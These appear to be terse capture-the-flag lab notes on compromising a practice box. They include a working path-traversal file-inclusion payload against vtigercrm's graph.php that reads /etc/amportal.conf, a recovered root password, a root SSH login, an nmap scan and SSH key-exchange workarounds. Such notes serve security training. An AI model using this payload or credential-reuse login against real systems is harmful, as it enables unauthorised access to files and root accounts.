can see an elastic  username password things

at /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

we have an lfi

ssh root@10.10.10.7

Try the password jEhdIekWmdjE and Yep! Got an SSH session.

tarting Nmap 7.92 ( https://nmap.org ) at 2023-04-07 06:39 EDT
Nmap scan report for 10.129.93.244
Host is up (0.082s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt

nable to negotiate with 10.129.93.244 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1

ssh -o KexAlgorithms=diffie-hellman-group1-sha1 root@10.129.93.244                    

└─$ ssh -o KexAlgorithms=ssh-rsa root@10.129.93.244
Unsupported KEX algorithm "ssh-rsa"
command-line line 0: Bad SSH2 KexAlgorithms 'ssh-rsa'.
                                                                              
┌──(kali㉿kali)-[~/pen300]
└─$ ssh -o KexAlgorithms=ssh-dss root@10.129.93.244
Unsupported KEX algorithm "ssh-dss"
command-line line 0: Bad SSH2 KexAlgorithms 'ssh-dss'

